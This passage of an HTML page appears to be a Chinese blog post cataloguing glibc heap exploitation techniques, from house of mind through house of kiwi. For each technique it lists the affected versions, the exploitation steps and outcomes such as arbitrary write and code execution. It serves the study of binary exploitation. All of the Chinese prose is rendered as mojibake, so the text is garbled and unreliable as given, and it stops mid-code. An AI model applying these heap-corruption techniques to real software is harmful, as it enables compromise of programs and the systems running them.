href="#åˆ©ç”¨æ•ˆæœ-12" class="headerlink" title="åˆ©ç”¨æ•ˆæœ"></a>åˆ©ç”¨æ•ˆæœ</h3><ul><li>ä»»æ„åœ°å€å†™å †åœ°å€</li></ul><h2 id="2-14-house-of-mind"><a href="#2-14-house-of-mind" class="headerlink" title="2.14-house of mind"></a>2.14-house of mind</h2><h3 id="æ¼æ´æˆå› -13"><a href="#æ¼æ´æˆå› -13" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>å †æº¢å‡º</p><h3 id="é€‚ç”¨èŒƒå›´-13"><a href="#é€‚ç”¨èŒƒå›´-13" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.23</code>â€”â€” è‡³ä»Š</li><li>å¯ä»¥åˆ†é…ä»»æ„å¤§å°çš„ <code>chunk</code></li></ul><h3 id="åˆ©ç”¨åŸç†-13"><a href="#åˆ©ç”¨åŸç†-13" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p>ä¸»è¦åˆ©ç”¨çš„æ˜¯ï¼š</p><table><thead><tr><th><code>1 2 3 4 </code></th><th><code>#define heap_for_ptr(ptr) \  ((heap_info *) ((unsigned long) (ptr) &amp; ~(HEAP_MAX_SIZE - 1))) #define arena_for_chunk(ptr) \  (chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)-&gt;ar_ptr : &amp;main_arena)</code></th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>å¦‚æœæ˜¯ <code>non-mainarean</code> çš„ <code>chunk</code>ï¼Œä¼šæ ¹æ®å…¶åœ°å€æ‰¾åˆ° <code>heapinfo</code>ï¼Œç„¶åæ‰¾åˆ° <code>malloc_state</code> ç»“æ„ä½“ã€‚</p><p>å› æ­¤ï¼Œåˆ©ç”¨æŠ€å·§æ˜¯ï¼š</p><ul><li>æ ¹æ®è¦é‡Šæ”¾çš„ <code>fastbin chunk A</code> çš„å †åœ°å€ï¼Œæ‰¾åˆ°å¯¹åº”çš„ <code>heap_for_ptr</code> åœ°å€</li><li>åœ¨ <code>heapinfo</code> åœ°å€å¤„ä¼ªé€ å¥½ç›¸å…³å˜é‡ï¼Œé‡ç‚¹æ˜¯ <code>mstate</code> æŒ‡é’ˆ</li><li>ä¿®æ”¹ <code>chunk A</code> çš„ <code>non-main</code> æ ‡å¿—ä½ï¼Œé‡Šæ”¾åˆ°ä¼ªé€ çš„ <code>arena</code> é‡Œé¢ï¼Œæ§åˆ¶å¥½åç§»å³å¯</li></ul><h3 id="ç›¸å…³æŠ€å·§-13"><a href="#ç›¸å…³æŠ€å·§-13" class="headerlink" title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><ul><li>ä¸€èˆ¬æ¥è¯´ï¼Œå¯ä»¥åˆ†é…ä»»æ„å¤§å°çš„ <code>chunk</code>ï¼Œè¿˜èƒ½å †æº¢å‡ºï¼Œå¾ˆå¤šæŠ€å·§éƒ½èƒ½ç”¨</li><li>è¿™ä¸ªæŠ€å·§æ˜¯å¸Œæœ›å¤§å®¶å…³æ³¨å¯¹äº <code>arena</code> çš„æ”»å‡»</li><li>ç”šè‡³å¯ä»¥ç›´æ¥ä¿®æ”¹ <code>thread_arena</code> è¿™ä¸ªå˜é‡</li></ul><h3 id="åˆ©ç”¨æ•ˆæœ-13"><a href="#åˆ©ç”¨æ•ˆæœ-13" class="headerlink" title="åˆ©ç”¨æ•ˆæœ"></a>åˆ©ç”¨æ•ˆæœ</h3><ul><li>ä»»æ„åœ°å€å†™å †åœ°å€</li></ul><h2 id="2-15-house-of-muney"><a href="#2-15-house-of-muney" class="headerlink" title="2.15-house of muney"></a>2.15-house of muney</h2><h3 id="æ¼æ´æˆå› -14"><a href="#æ¼æ´æˆå› -14" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>å †æº¢å‡º</p><h3 id="é€‚ç”¨èŒƒå›´-14"><a href="#é€‚ç”¨èŒƒå›´-14" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.23</code>â€”â€” è‡³ä»Š</li><li>èƒ½åˆ†é… <code>mmap</code> çš„ <code>chunk</code></li><li>èƒ½ä¿®æ”¹ <code>mmap</code> çš„ <code>chunk</code> çš„å¤§å°</li></ul><h3 id="åˆ©ç”¨åŸç†-14"><a href="#åˆ©ç”¨åŸç†-14" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p>è¿™ä¸ªæŠ€å·§è¢«ç§°ä¹‹ä¸º <code>steal heap from glibc</code>ã€‚ä¸»è¦çš„ç‚¹æœ‰ä»¥ä¸‹å‡ ä¸ªï¼š</p><ul><li><code>libc.so.6</code> æ˜ å°„çš„åœ°å€ç©ºé—´ï¼Œå‰é¢éƒ½æ˜¯ä¸ç¬¦å·è¡¨ã€å“ˆå¸Œè¡¨ã€å­—ç¬¦ä¸²è¡¨ç­‰é‡å®šä½æˆ–è€…è§£æå‡½æ•°åœ°å€æœ‰å…³ï¼Œå‰é¢ä¸€æ®µçš„æƒé™æ˜¯ <code>r--</code></li><li><code>mmap(NULL, ...)</code> æ˜¯ä¼šåˆ†é…åˆ° <code>libc.so.6</code> çš„ä¸Šæ–¹çš„</li></ul><p>åŸºäºè¿™ä¸¤ä¸ªçŸ¥è¯†ç‚¹ï¼Œåˆ©ç”¨è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ul><li>ç”³è¯· <code>chunk A</code>ï¼Œå‡è®¾ä¸º <code>0x40000</code> å¤§å°ï¼Œåˆ™ä¼šèµ° <code>mmap</code> ç”³è¯·ï¼Œå¹¶ä¸”ç”³è¯·åˆ° <code>libc.so.6</code> çš„ä¸Šæ–¹</li><li>ä¿®æ”¹ <code>chunk A</code> çš„å¤§å°ä¸º <code>0x45000</code>ï¼Œè®¾ç½® <code>MMAP</code> æ ‡å¿—ä½</li><li>é‡Šæ”¾ <code>chunk A</code>ï¼Œåˆ™ä¼šæŠŠ <code>libc.so.6</code> çš„ <code>0x5000</code> çš„å†…å­˜ä¹Ÿé‡Šæ”¾æ‰</li><li>å†æ¬¡ç”³è¯· <code>0x45000</code>ï¼Œå°±å¯ä»¥æ§åˆ¶ <code>libc.so.6</code> åŸæ¥çš„ç¬¦å·è¡¨ã€å“ˆå¸Œè¡¨ç­‰ç­‰</li><li>è§¦å‘ä¸€æ¬¡ <code>dl_runtime_resolve</code> ç­‰å°±èƒ½æ§åˆ¶ç¨‹åºæ‰§è¡Œä»»æ„ä»£ç </li></ul><h3 id="ç›¸å…³æŠ€å·§-14"><a href="#ç›¸å…³æŠ€å·§-14" class="headerlink" title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><ul><li>éœ€è¦ä¼ªé€ çš„ç¬¦å·è¡¨ã€å“ˆå¸Œè¡¨ç­‰éœ€è¦é€æ­¥è°ƒè¯•</li><li>å¯ä»¥æ‰©å±•ä¸º <code>steal heap from everywhere</code></li></ul><h3 id="åˆ©ç”¨æ•ˆæœ-14"><a href="#åˆ©ç”¨æ•ˆæœ-14" class="headerlink" title="åˆ©ç”¨æ•ˆæœ"></a>åˆ©ç”¨æ•ˆæœ</h3><ul><li>ä»»æ„ä»£ç æ‰§è¡Œ</li></ul><h2 id="2-16-house-of-botcake"><a href="#2-16-house-of-botcake" class="headerlink" title="2.16-house of botcake"></a>2.16-house of botcake</h2><h3 id="æ¼æ´æˆå› -15"><a href="#æ¼æ´æˆå› -15" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><figure class="highlight irpf90"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs irpf90"><span class="hljs-keyword">double</span> <span class="hljs-keyword">free</span><br></code></pre></td></tr></tbody></table></figure><h3 id="é€‚ç”¨èŒƒå›´-15"><a href="#é€‚ç”¨èŒƒå›´-15" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.26</code>â€”â€” è‡³ä»Š</li><li>å¤šæ¬¡é‡Šæ”¾ <code>chunk</code> çš„èƒ½åŠ›</li></ul><h3 id="åˆ©ç”¨åŸç†-15"><a href="#åˆ©ç”¨åŸç†-15" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p>è¯¥æŠ€å·§å¯ä»¥ç”¨äºç»•è¿‡ <code>tcache-&gt;key</code> çš„æ£€æŸ¥ï¼Œåˆ©ç”¨è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ul><li>ç”³è¯· <code>7</code> ä¸ªå¤§å°ç›¸åŒï¼Œå¤§å°å¤§äº <code>0x80</code> çš„ <code>chunk</code>ï¼Œå†ç”³è¯·ä¸‰ä¸ªï¼Œåˆ†åˆ«ä¸º <code>chunk A</code> å’Œ <code>chunkB</code> å’Œ <code>chunk C</code></li><li>é‡Šæ”¾å‰ <code>7</code> ä¸ªå’Œ <code>chunk A</code>ï¼Œå‰é¢ <code>7</code> ä¸ªéƒ½ä¼šè¿›å…¥åˆ° <code>tcachebin</code> é‡Œé¢ï¼Œ<code>chunk A</code> è¿›å…¥åˆ° <code>unsortedbin</code></li><li>é‡Šæ”¾ <code>chunk B</code>ï¼Œåˆ™ <code>chunk B</code> ä¼šå’Œ <code>chunk A</code> åˆå¹¶</li><li>ä» <code>tcachebin</code> åˆ†é…èµ°ä¸€ä¸ª</li><li>å†æ¬¡é‡Šæ”¾ <code>chunk B</code>ï¼Œæ­¤æ—¶ <code>B</code> åŒæ—¶å­˜åœ¨ä¸ <code>unsortedbin</code> å’Œ <code>tcachebin</code></li></ul><h3 id="ç›¸å…³æŠ€å·§-15"><a href="#ç›¸å…³æŠ€å·§-15" class="headerlink" title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><ul><li>åœ¨é«˜ç‰ˆæœ¬éœ€è¦ç»•è¿‡æŒ‡é’ˆä¿æŠ¤çš„æ£€æŸ¥</li></ul><h3 id="åˆ©ç”¨æ•ˆæœ-15"><a href="#åˆ©ç”¨æ•ˆæœ-15" class="headerlink" title="åˆ©ç”¨æ•ˆæœ"></a>åˆ©ç”¨æ•ˆæœ</h3><ul><li>æ„é€ å‡ºå †é‡å ï¼Œä¸ºåç»­åˆ©ç”¨åšå‡†å¤‡</li></ul><h2 id="2-17-house-of-rust"><a href="#2-17-house-of-rust" class="headerlink" title="2.17-house of rust"></a>2.17-house of rust</h2><h3 id="æ¼æ´æˆå› -16"><a href="#æ¼æ´æˆå› -16" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>å †æº¢å‡º</p><h3 id="é€‚ç”¨èŒƒå›´-16"><a href="#é€‚ç”¨èŒƒå›´-16" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.26</code>â€”â€” è‡³ä»Š</li><li>å¯ä»¥è¿›è¡Œ <code>tcache stash unlinking</code> æ”»å‡»</li><li>å¯ä»¥è¿›è¡Œ <code>largebin attack</code></li><li>ä¸éœ€è¦æ³„éœ²åœ°å€</li></ul><h3 id="åˆ©ç”¨åŸç†-16"><a href="#åˆ©ç”¨åŸç†-16" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p>åŸä½œè€…çš„åšå®¢å†™å¾—å¾ˆå¤æ‚ï¼Œæˆ‘è¿™é‡Œæç‚¼å‡ºå…³é”®ä¿¡æ¯ã€‚è¯¥æŠ€å·§å°±æ˜¯ <code>tcachebin stash unlinking</code>+<code>largebin attack</code> çš„ç»„åˆæŠ€å·§ã€‚</p><p>é¦–å…ˆéœ€è¦çŸ¥é“ <code>tcachebin stash unlinking</code>ï¼Œä¸‹é¢ç§°ä¹‹ä¸º <code>TSU</code> æŠ€å·§ï¼š</p><ul><li><code>tcachebin[A]</code> ä¸ºç©º</li><li><code>smallbin[A]</code> æœ‰ <code>8</code> ä¸ª</li><li>ä¿®æ”¹ç¬¬ <code>8</code> ä¸ª <code>smallbin chunk</code> çš„ <code>bk</code> ä¸º <code>addr</code></li><li>åˆ†é… <code>malloc(A)</code> çš„æ—¶å€™ï¼Œ<code>addr+0x10</code> ä¼šè¢«å†™ä¸€ä¸ª <code>libc</code> åœ°å€</li></ul><p>è¿˜è¦çŸ¥é“ <code>tcachebin stash unlinking+</code>ï¼Œä¸‹é¢ç§°ä¹‹ä¸º <code>TSU+</code> æŠ€å·§ï¼š</p><ul><li><code>tcachebin[A]</code> ä¸ºç©º</li><li><code>smallbin[A]</code> æœ‰ <code>8</code> ä¸ª</li><li>ä¿®æ”¹ç¬¬ <code>7</code> ä¸ª <code>smallbin chunk</code> çš„ <code>bk</code> ä¸º <code>addr</code>ï¼Œè¿˜è¦ä¿è¯ <code>addr+0x18</code> æ˜¯ä¸€ä¸ªåˆæ³•å¯å†™çš„åœ°å€</li><li>åˆ†é… <code>malloc(A)</code> çš„æ—¶å€™ï¼Œ<code>addr</code> ä¼šè¢«é“¾å…¥åˆ° <code>tcachebin</code>ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥åˆ†é…åˆ° <code>addr</code> å¤„</li></ul><p>ä»¥ <code>0x90</code> å¤§å°çš„ <code>chunk</code> ä¸ºä¾‹ï¼Œæ­¤æ—¶çš„ <code>tcache_key</code> è¿˜æ˜¯æŒ‡å‘ <code>tcache_perthread_struct + 0x10</code> çš„ï¼š</p><ul><li>ç¬¬ä¸€æ­¥ï¼ŒæŠŠ <code>tcachebin[0x90]</code> å¡«æ»¡ï¼ŒæŠŠ <code>smallbin[0x90]</code> ä¹Ÿå¡«æ»¡</li><li>ç¬¬äºŒæ­¥ï¼ŒæŠŠæœ€åä¸€ä¸ª <code>smallbin 0x90</code> çš„ <code>chunk</code> çš„ <code>size</code> æ”¹æˆ <code>0xb0</code>ï¼Œå°†å…¶é‡Šæ”¾åˆ° <code>tcachebin[0xb0]</code>ï¼Œè¿™ä¸€æ­¥ä¸»è¦æ˜¯ä¸ºäº†æ”¹å˜å…¶ <code>bk</code> æŒ‡å‘ <code>tcache_perthread_struct + 0x10</code>ï¼Œå¯ä»¥éƒ¨åˆ†ä¿®æ”¹ä½ä½çš„å­—èŠ‚ï¼Œä»¥ä¾¿ä¸‹ä¸€æ­¥åˆ†é…åˆ°ç›®æ ‡åŒºåŸŸ</li><li>ç¬¬ä¸‰æ­¥ï¼Œä½¿ç”¨ <code>largebin attack</code> å¾€ä¸Šä¸€æ­¥çš„ <code>bk-&gt;bk</code> å†™ä¸€ä¸ªåˆæ³•åœ°å€ï¼Œç„¶åè€—å°½ <code>tcachebin[0x90]</code>ï¼Œå†åˆ†é…çš„æ—¶å€™å°±ä¼šè§¦å‘ <code>TSU+</code>ï¼Œä¹‹åå°±èƒ½åˆ†é…åˆ° <code>tcache_perthread_struct </code>ç»“æ„ä½“</li><li>ç¬¬å››æ­¥ï¼Œè¿˜æ˜¯å †é£æ°´ï¼Œä½†æ˜¯ç”¨ <code>TSU</code> æŠ€æœ¯ï¼Œåœ¨ <code>tcache_perthread_struct</code> ä¸Šå†™ä¸€ä¸ª <code>libc</code> åœ°å€ï¼ˆæ¯”å‰é¢ä¸€æ­¥è¦ç®€å•å¾ˆå¤šï¼‰</li><li>ç¬¬äº”æ­¥ï¼Œé€šè¿‡æ§åˆ¶ <code>tcache_perthread_struct</code> ç»“æ„ä½“ï¼Œéƒ¨åˆ†å†™ä¸Šé¢çš„ <code>libc</code> åœ°å€ï¼Œåˆ†é…åˆ° <code>stdout</code> ç»“æ„ä½“ï¼Œæ³„éœ²ä¿¡æ¯</li><li>ç¬¬å…­æ­¥ï¼Œé€šè¿‡æ§åˆ¶ <code>tcache_perthread_struct</code> ç»“æ„ä½“åˆ†é…åˆ°ä»»æ„åœ°å€</li></ul><p>ä¸Šé¢çš„è¿‡ç¨‹æœ€å¥½çš„æƒ…å†µä¸‹éœ€è¦çˆ†ç ´ <code>1/16</code>ï¼Œæœ€å·® <code>1/256</code>ã€‚</p><p>ä½†æ˜¯ï¼Œ<code>2.34</code> ä¹‹åï¼Œ<code>tcache_key</code> æ˜¯ä¸€ä¸ªéšæœºæ•°ï¼Œä¸æ˜¯ <code>tcache_perthread_struct + 0x10</code> äº†ã€‚</p><p>æ‰€ä»¥ï¼Œæ­¤æ—¶å¯ä»¥åŠ ä¸Š <code>largebin attack</code>ï¼ŒæŠŠä»¥ä¸Šçš„ç¬¬äºŒæ­¥å˜ä¸ºï¼šç»§ç»­ç”¨ <code>largebin attack</code> å‘å…¶ <code>bk</code> å†™ä¸€ä¸ªå †åœ°å€ï¼Œç„¶åè¿˜è¦éƒ¨åˆ†å†™ <code>bk</code> ä½¿å…¶è½åœ¨ <code>tcache_perthread_struct</code> åŒºåŸŸã€‚å…¶ä»–æ­¥éª¤ä¸€æ ·ã€‚</p><p>æˆ–è€…ï¼Œåœ¨ <code>smallbin</code> é‡Œé¢æ”¾ <code>9</code> ä¸ªï¼Œè¿™æ ·ç¬¬ <code>8</code> ä¸ªçš„ <code>bk</code> è‚¯å®šå°±æ˜¯ä¸€ä¸ªå †åœ°å€ã€‚æ­¤æ—¶å°±éœ€è¦çˆ†ç ´ <code>1/16</code> çš„å †ï¼Œ<code>1/16</code> çš„ <code>glibc</code> åœ°å€ï¼ŒæˆåŠŸçš„æ¦‚ç‡æ˜¯ <code>1/256</code>ã€‚</p><h3 id="ç›¸å…³æŠ€å·§-16"><a href="#ç›¸å…³æŠ€å·§-16" class="headerlink" title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><ul><li>æ€»çš„æ¥è¯´ï¼Œå°±æ˜¯åˆ©ç”¨ <code>tcachebin stash unlinking</code> æ‰“ <code>tcache_perthread_struct</code></li><li>åˆ©ç”¨ <code>largebin attack</code> æ„é€ åˆæ³•åœ°å€</li></ul><h3 id="åˆ©ç”¨æ•ˆæœ-16"><a href="#åˆ©ç”¨æ•ˆæœ-16" class="headerlink" title="åˆ©ç”¨æ•ˆæœ"></a>åˆ©ç”¨æ•ˆæœ</h3><ul><li>ä»»æ„åœ°å€åˆ†é…</li><li>ä»»æ„å‡½æ•°æ‰§è¡Œ</li></ul><h2 id="2-18-house-of-crust"><a href="#2-18-house-of-crust" class="headerlink" title="2.18-house of crust"></a>2.18-house of crust</h2><h3 id="æ¼æ´æˆå› -17"><a href="#æ¼æ´æˆå› -17" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>å †æº¢å‡º</p><h3 id="é€‚ç”¨èŒƒå›´-17"><a href="#é€‚ç”¨èŒƒå›´-17" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.26</code>â€”â€”<code>2.37</code></li><li>å¯ä»¥è¿›è¡Œ <code>tcache stash unlinking</code> æ”»å‡»</li><li>å¯ä»¥è¿›è¡Œ <code>largebin attack</code></li><li>ä¸éœ€è¦æ³„éœ²åœ°å€</li></ul><h3 id="åˆ©ç”¨åŸç†-17"><a href="#åˆ©ç”¨åŸç†-17" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p>å…¶ä»–æ­¥éª¤å’Œä¸Šé¢çš„ <code>house of rust</code> ä¸€æ ·ï¼Œä½†æ˜¯åˆ°ç¬¬äº”æ­¥çš„æ—¶å€™ï¼Œå»ä¿®æ”¹ <code>global_max_fast</code></p><p>åé¢çš„æ­¥éª¤å’Œ <code>house of corrosion</code> æ˜¯ä¸€æ ·çš„ï¼Œé€šè¿‡å†™åŸè¯­æ‰“ <code>stderr</code> ä¿®æ”¹ <code>one_gadget</code> æ‹¿åˆ° <code>shell</code>ã€‚</p><h3 id="ç›¸å…³æŠ€å·§-17"><a href="#ç›¸å…³æŠ€å·§-17" class="headerlink" title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><ul><li><code>house of crust = house of corrosion + house of rust</code></li><li><code>2.37</code> ä¹‹åï¼Œ<code>house of corrosion</code> ä½¿ç”¨å—é™</li></ul><h2 id="2-19-house-of-io"><a href="#2-19-house-of-io" class="headerlink" title="2.19-house of io"></a>2.19-house of io</h2><h3 id="æ¼æ´æˆå› -18"><a href="#æ¼æ´æˆå› -18" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>å †æº¢å‡º</p><h3 id="é€‚ç”¨èŒƒå›´-18"><a href="#é€‚ç”¨èŒƒå›´-18" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.26</code>â€”â€” è‡³ä»Š</li></ul><h3 id="åˆ©ç”¨åŸç†-18"><a href="#åˆ©ç”¨åŸç†-18" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p>å…¶ä»–åšå®¢ä¸Šå¯¹è¯¥æ–¹æ³•çš„ä»‹ç»å¦‚ä¸‹ï¼š</p><table><thead><tr><th><code>1 </code></th><th><code>The tcache_perthread_object is allocated when the heap is created. Furthermore, it is stored right at the heap's beginning (at a relatively low memory address). The safe-linking mitigation aims to protect the fd/next pointer within the free lists. However, the head of each free-list is not protected. Additionally, freeing a chunk and placing it into the tcachebin also places a non-protected pointer to the appropriate tcache entry in the 2nd qword of a chunks' user data. The House of IO assumes one of three scenarios for the bypass to work. First, any attacker with a controlled linear buffer underflow over a heap buffer, or a relative arbitrary write will be able to corrupt the tcache. Secondly, a UAF bug allowing to read from a freed tcache eligible chunk leaks the tcache and with that, the heap base. Thirdly, a badly ordered set of calls to free(), ultimately passing the address of the tcache itself to free, would link the tcache into the 0x290 sized tcachebin. Allocating it as a new chunk would mean complete control over the tcache's values.</code></th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>å¯ä»¥çœ‹å‡ºæ¥ï¼Œå…¶å®å°±æ˜¯å¯¹ <code>tcache_perthread_struct</code> ç»“æ„ä½“çš„æ”»å‡»ï¼Œæƒ³åŠæ³•å°†å…¶é‡Šæ”¾æ‰ï¼Œç„¶åå†ç”³è¯·å›æ¥ï¼Œç”³è¯·å›æ¥çš„æ—¶å€™å°±èƒ½æ§åˆ¶æ•´ä¸ª <code>tcache</code> çš„åˆ†é…ã€‚</p><h3 id="ç›¸å…³æŠ€å·§-18"><a href="#ç›¸å…³æŠ€å·§-18" class="headerlink" title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><ul><li>å›´ç»• <code>tcache_perthread_struct</code> è¿›è¡Œæ”»å‡»</li></ul><h3 id="åˆ©ç”¨æ•ˆæœ-17"><a href="#åˆ©ç”¨æ•ˆæœ-17" class="headerlink" title="åˆ©ç”¨æ•ˆæœ"></a>åˆ©ç”¨æ•ˆæœ</h3><ul><li>ä»»æ„åœ°å€åˆ†é…</li></ul><h2 id="2-20-house-of-banana"><a href="#2-20-house-of-banana" class="headerlink" title="2.20-house of banana"></a>2.20-house of banana</h2><h3 id="æ¼æ´æˆå› -19"><a href="#æ¼æ´æˆå› -19" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>å †æº¢å‡º</p><h3 id="é€‚ç”¨èŒƒå›´-19"><a href="#é€‚ç”¨èŒƒå›´-19" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.23</code>â€”â€” è‡³ä»Š</li><li>å¯ä»¥è¿›è¡Œ <code>largebin attack</code></li><li>èƒ½æ‰§è¡Œ <code>exit</code> å‡½æ•°</li></ul><h3 id="åˆ©ç”¨åŸç†-19"><a href="#åˆ©ç”¨åŸç†-19" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p>é¦–å…ˆæ˜¯ <code>largebin attack</code> åœ¨é«˜ç‰ˆæœ¬åªèƒ½ä»ä¸‹é¢è¿™ä¸ªåˆ†æ”¯åˆ©ç”¨ï¼š</p><p>ä¹Ÿå°±æ˜¯ï¼ŒåŒé“¾è¡¨é‡Œé¢è‡³å°‘å­˜åœ¨ä¸€ä¸ª <code>largebin chunk</code>ï¼Œä¸”ç›®å‰è¦å…¥é“¾çš„ <code>chunk</code> æ¯”æœ€å°çš„è¿˜å°ï¼Œä¿®æ”¹äº† <code>bk_nextsize</code> ä¹‹åå°±ä¼šè§¦å‘ã€‚å¯ä»¥é€ æˆä»»æ„åœ°å€å†™å †åœ°å€ã€‚</p><p>ç„¶åæ˜¯ <code>exit</code> è°ƒç”¨çš„æ—¶å€™ï¼Œä¼šè°ƒç”¨åˆ°<code>_dl_fini</code> å‡½æ•°ï¼Œæ‰§è¡Œæ¯ä¸ª <code>so</code> ä¸­æ³¨å†Œçš„ <code>fini</code> å‡½æ•°ï¼š</p><p>å¯ä»¥è§¦å‘ <code>call</code> çš„æœ‰ä¸¤ä¸ªç‚¹ï¼Œç¬¬ä¸€ä¸ªç‚¹å¯ä»¥ <code>call</code> åˆ°å¾ˆå¤šæŒ‡é’ˆï¼Œæ˜¯ä¸€ä¸ªæ•°ç»„ï¼›å¦ä¸€ä¸ªç‚¹å°±åªæœ‰ä¸€ä¸ªå‡½æ•°ã€‚</p><p>å‰©ä¸‹çš„å·¥ä½œå°±æ˜¯æ ¹æ®ä»£ç ç»•è¿‡æ£€æµ‹ï¼Œè°ƒç”¨åˆ°è°ƒç”¨ç‚¹ã€‚</p><p>æ‰€ä»¥ï¼Œåˆ©ç”¨çš„æ€è·¯æœ‰ï¼š</p><ul><li>ç›´æ¥ä¼ªé€ <code>_rtld_global</code> çš„<code>_ns_loaded</code>ï¼Œå¸ƒå±€å¥½å…¶ä»–å†…å®¹ï¼Œä½¿å…¶è°ƒç”¨åˆ° <code>fini_array</code></li><li>ä¼ªé€  <code>link_map</code> çš„ <code>next</code> æŒ‡é’ˆï¼Œå¸ƒå±€å¥½å…¶ä»–å†…å®¹ï¼Œä½¿å…¶è°ƒç”¨åˆ° <code>fini_array</code></li><li>ä¿®æ”¹ <code>link_map-&gt;l_addr</code>ï¼Œæ ¹æ®åç§»ä½¿å…¶è°ƒç”¨åˆ°æŒ‡å®šåŒºåŸŸçš„å‡½æ•°</li></ul><h3 id="ç›¸å…³æŠ€å·§-19"><a href="#ç›¸å…³æŠ€å·§-19" class="headerlink" title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><ul><li>ä¼ªé€  <code>fini_array</code> æ•°ç»„çš„æ—¶å€™ï¼Œæ˜¯ä»åå¾€å‰éå†çš„</li><li>æœ‰æ—¶å€™è¿œç¨‹çš„ <code>rtld_global</code> çš„åç§»ä¸æœ¬åœ°ä¸ä¸€æ ·ï¼Œéœ€è¦çˆ†ç ´</li><li>å¦‚æœä¸æƒ³é€ä¸ªä¼ªé€ ï¼Œå¯ä»¥ç›´æ¥ç”¨ <code>gdb</code> ä»å†…å­˜é‡Œé¢ <code>dump</code> å‡ºæ¥ï¼Œç„¶ååŸºäºåç§»ä¿®æ”¹å†…å­˜å³å¯</li></ul><h3 id="åˆ©ç”¨æ•ˆæœ-18"><a href="#åˆ©ç”¨æ•ˆæœ-18" class="headerlink" title="åˆ©ç”¨æ•ˆæœ"></a>åˆ©ç”¨æ•ˆæœ</h3><ul><li>ä»»æ„ä»£ç æ‰§è¡Œ</li></ul><h2 id="2-21-house-of-kiwi"><a href="#2-21-house-of-kiwi" class="headerlink" title="2.21-house of kiwi"></a>2.21-house of kiwi</h2><h3 id="æ¼æ´æˆå› -20"><a href="#æ¼æ´æˆå› -20" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>å †æº¢å‡º</p><h3 id="é€‚ç”¨èŒƒå›´-20"><a href="#é€‚ç”¨èŒƒå›´-20" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.23</code>â€”â€”<code>2.36</code></li><li>åœ¨ <code>malloc</code> æµç¨‹ä¸­è§¦å‘ <code>assert</code></li></ul><h3 id="åˆ©ç”¨åŸç†-20"><a href="#åˆ©ç”¨åŸç†-20" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p>ä¸»è¦æ˜¯æä¾›äº†ä¸€ç§åœ¨ç¨‹åºä¸­è°ƒç”¨ <code>IO</code> æµå‡½æ•°çš„æ€è·¯ï¼š</p><p>å¯ä»¥çœ‹åˆ°ï¼Œè°ƒç”¨åˆ°äº† <code>fxprintf</code> å’Œ <code>fflush</code>ã€‚</p><p>è‡³äºåŸ <code>house of kiwi</code> æ‰€æåˆ°çš„æ§åˆ¶ <code>rdx</code> çš„æ€è·¯ï¼Œåœ¨å¾ˆå¤šç‰ˆæœ¬ä¸­æ— æ³•ä½¿ç”¨ï¼Œå› ä¸º <code>IO_jumps_table</code> éƒ½æ˜¯ä¸å¯å†™çš„ï¼Œæ•…æ­¤å¤„ä¸å†è¯¦è¿°ã€‚</p><h3 id="ç›¸å…³æŠ€å·§-20"><a href="#ç›¸å…³æŠ€å·§-20" class="headerlink" title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><ul><li>åœ¨ <code>2.36</code> ä¹‹åï¼Œ<code>__malloc_assert</code> è¢«ä¿®æ”¹ä¸ºï¼š</li></ul><table><thead><tr><th><code>1 2 3 4 5 6 7 8 9 </code></th><th><code>_Noreturn static void __malloc_assert (const char *assertion, const char *file, unsigned int line,  const char *function) {  __libc_message (do_abort, "\ Fatal glibc error: malloc 